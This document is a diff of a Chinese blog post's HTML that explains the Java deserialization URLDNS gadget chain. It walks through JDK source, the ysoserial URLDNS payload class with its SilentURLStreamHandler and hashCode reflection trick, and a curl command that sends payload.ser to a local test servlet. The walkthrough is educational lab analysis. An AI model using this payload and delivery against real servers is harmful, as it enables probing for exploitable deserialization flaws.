 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116211130053.png" alt="image-20211116211130053"></p>
-<h2 id="getAllByName0"><a href="#getAllByName0" class="headerlink" title="getAllByName0()"></a>getAllByName0()</h2><pre><code class="java">private static InetAddress[] getAllByName0 (String host, InetAddress reqAddr, boolean check)
-    throws UnknownHostException  &#123;
+<h2 id="getAllByName0"><a href="#getAllByName0" class="headerlink" title="getAllByName0()"></a>getAllByName0()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> InetAddress[] getAllByName0 (String host, InetAddress reqAddr, <span class="type">boolean</span> check)</span><br><span class="line">    <span class="keyword">throws</span> UnknownHostException  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If it gets here it is presumed to be a hostname */</span></span><br><span class="line">    <span class="comment">/* Cache.get can return: null, unknownAddress, or InetAddress[] */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make sure the connection to the host is allowed, before we</span></span><br><span class="line"><span class="comment">     * give out a hostname</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (check) &#123;<span class="comment">//先判断连接是否被允许</span></span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="literal">null</span>) &#123;</span><br><span class="line">            security.checkConnect(host, -<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    InetAddress[] addresses = getCachedAddresses(host);<span class="comment">//从缓存中查找域名对应的IP地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If no entry in cache, then do the host lookup */</span></span><br><span class="line">    <span class="keyword">if</span> (addresses == <span class="literal">null</span>) &#123;<span class="comment">//如果缓存中没有记录</span></span><br><span class="line">        addresses = getAddressesFromNameService(host, reqAddr);<span class="comment">//发起DNS请求</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (addresses == unknown_array)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnknownHostException</span>(host);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addresses.clone();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    /* If it gets here it is presumed to be a hostname */
-    /* Cache.get can return: null, unknownAddress, or InetAddress[] */
-
-    /* make sure the connection to the host is allowed, before we
-     * give out a hostname
-     */
-    if (check) &#123;//先判断连接是否被允许
-        SecurityManager security = System.getSecurityManager();
-        if (security != null) &#123;
-            security.checkConnect(host, -1);
-        &#125;
-    &#125;
-
-    InetAddress[] addresses = getCachedAddresses(host);//从缓存中查找域名对应的IP地址
-
-    /* If no entry in cache, then do the host lookup */
-    if (addresses == null) &#123;//如果缓存中没有记录
-        addresses = getAddressesFromNameService(host, reqAddr);//发起DNS请求
-    &#125;
-
-    if (addresses == unknown_array)
-        throw new UnknownHostException(host);
-
-    return addresses.clone();
-&#125;
-</code></pre>
 <p>从上述代码，我们能够发现，<code>getAddressesFromNameService()</code>就是最终发起DNS请求的方法。</p>
 <h2 id="getAddressesFromNameService"><a href="#getAddressesFromNameService" class="headerlink" title="getAddressesFromNameService()"></a>getAddressesFromNameService()</h2><p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116211837716.png" alt="image-20211116211837716"></p>
 <h1 id="简易利用链分析-Java-1-8"><a href="#简易利用链分析-Java-1-8" class="headerlink" title="简易利用链分析(Java 1.8)"></a>简易利用链分析(Java 1.8)</h1><p>Java1.8和1.7虽然代码有些许区别，但是最后也是会到hash()方法，然后接下来的链都是一样的</p>
 <blockquote>
-<pre><code class="java">HashMap-&gt;readObject
-HashMap-&gt;putval
-HashMap-&gt;hash
-URL-&gt;hashCode
-URLStreamHandler-&gt;hashCode
-URLStreamHandler-&gt;getHostAddress
-    .....
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashMap-&gt;readObject</span><br><span class="line">HashMap-&gt;putval</span><br><span class="line">HashMap-&gt;hash</span><br><span class="line">URL-&gt;hashCode</span><br><span class="line">URLStreamHandler-&gt;hashCode</span><br><span class="line">URLStreamHandler-&gt;getHostAddress</span><br><span class="line">    .....</span><br></pre></td></tr></table></figure>
 </blockquote>
 <p>此处就不演示了。</p>
-<h1 id="Ysoserial中的利用链"><a href="#Ysoserial中的利用链" class="headerlink" title="Ysoserial中的利用链"></a>Ysoserial中的利用链</h1><h2 id="巧妙的SilentURLStreamHandler"><a href="#巧妙的SilentURLStreamHandler" class="headerlink" title="巧妙的SilentURLStreamHandler"></a>巧妙的SilentURLStreamHandler</h2><pre><code class="java">public class URLDNS implements ObjectPayload&lt;Object&gt; &#123;
+<h1 id="Ysoserial中的利用链"><a href="#Ysoserial中的利用链" class="headerlink" title="Ysoserial中的利用链"></a>Ysoserial中的利用链</h1><h2 id="巧妙的SilentURLStreamHandler"><a href="#巧妙的SilentURLStreamHandler" class="headerlink" title="巧妙的SilentURLStreamHandler"></a>巧妙的SilentURLStreamHandler</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();<span class="comment">//avoid any DNS resolution</span></span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); </span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); </span><br><span class="line">                ht.put(u, url); </span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-        public Object getObject(final String url) throws Exception &#123;
-
-                URLStreamHandler handler = new SilentURLStreamHandler();//avoid any DNS resolution
-
-                HashMap ht = new HashMap(); 
-                URL u = new URL(null, url, handler); 
-                ht.put(u, url); 
-                Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);
-
-                return ht;
-        &#125;
-
-        public static void main(final String[] args) throws Exception &#123;
-                PayloadRunner.run(URLDNS.class, args);
-        &#125;
-
-
-        static class SilentURLStreamHandler extends URLStreamHandler &#123;
-
-                protected URLConnection openConnection(URL u) throws IOException &#123;
-                        return null;
-                &#125;
-
-                protected synchronized InetAddress getHostAddress(URL u) &#123;
-                        return null;
-                &#125;
-        &#125;
-&#125;
-</code></pre>
 <p><strong>Ysoserial</strong>并没有像我们之前看到的简易利用链那样去用反射的方法在<code>hashmap.put</code>前修改hashCode的值，相反它用了一个非常聪明的办法：<strong>重写handler</strong>。</p>
 <p><code>SilentURLStreamHandler</code>继承了<code>URLStreamHandler</code>（因为后者是abstract，不能被创建instance），里面包含两个method，一个是<code>openConnection</code> 一个是<code>getHostAddress</code></p>
 <p>其中<code>getHostAddress ()</code>我们非常熟悉，复习下之前的原生态<strong>getHostAddress</strong>的内容：</p>
@@ -499,13 +267,11 @@ URLStreamHandler-&gt;getHostAddress
 <h2 id="生成HashMap与URL"><a href="#生成HashMap与URL" class="headerlink" title="生成HashMap与URL"></a>生成HashMap与URL</h2><p>创建<strong>HashMap</strong>后，我们需要把URL放进hashmap中， 因为我们已经创建了一个handler，所以我们需要把handler赋给新创建的URL。</p>
 <p>在URL的<strong>constructor</strong>中，我们可以看到，<code>URLStreamHandler</code>是可以自定义的</p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116214812588.png" alt="image-20211116214812588"></p>
-<pre><code class="java">HashMap ht = new HashMap(); // HashMap that will contain the URL
-URL u = new URL(null, url, handler); // URL to use as the Key
-ht.put(u, url); //value可以为任何值，这里Ysoserial把value设置为了我们的URLDNS接收的网址(url)
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">ht.put(u, url); <span class="comment">//value可以为任何值，这里Ysoserial把value设置为了我们的URLDNS接收的网址(url)</span></span><br></pre></td></tr></table></figure>
+
 <p>在<strong>hashmap</strong>的<strong>put</strong>完成后，过程中<strong>hashCode</strong>肯定还会变化（即使在检测<strong>hashCode!=-1</strong>的步骤那里我们满足了条件），我们仍需要将他改回**-1**，以便server在执行反序列化的时候，我们的payload可以生效。</p>
-<pre><code class="java">Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
 <h2 id="序列化时的问题"><a href="#序列化时的问题" class="headerlink" title="序列化时的问题"></a>序列化时的问题</h2><p>我们刚刚提到，Ysoserial重写了**getHostAddress()**方法，那我们序列化后的object岂不是也是用这个复写后的方法，服务器进行反序列化时就不会触发URLDNS了？</p>
 <p>Ysoserial也解释了这一点：</p>
 <blockquote>
@@ -519,8 +285,8 @@ ht.put(u, url); //value可以为任何值，这里Ysoserial把value设置为了�
 <p><strong>注意：在之前的分析中提到过，我们需要加上协议(http://)</strong></p>
 <p><strong>Serializer.java：</strong></p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116221003206.png" alt="image-20211116221003206"></p>
-<pre><code class="bash">curl http://localhost:9090/webTest1_Web_exploded/test --data-binary @payload.ser
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:9090/webTest1_Web_exploded/test --data-binary @payload.ser</span><br></pre></td></tr></table></figure>
+
 <p>刷新URLDNS平台后成功收到记录：</p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116221323622.png" alt="image-20211116221323622"></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>URLDNS</strong>利用链从<strong>HashMap</strong>入手，到URL类自身的一系列<strong>methods</strong>连成利用链，包括<strong>Ysoserial</strong>对<strong>Handler</strong>的覆写和<strong>transient</strong>的理解，都十分巧妙。</p>
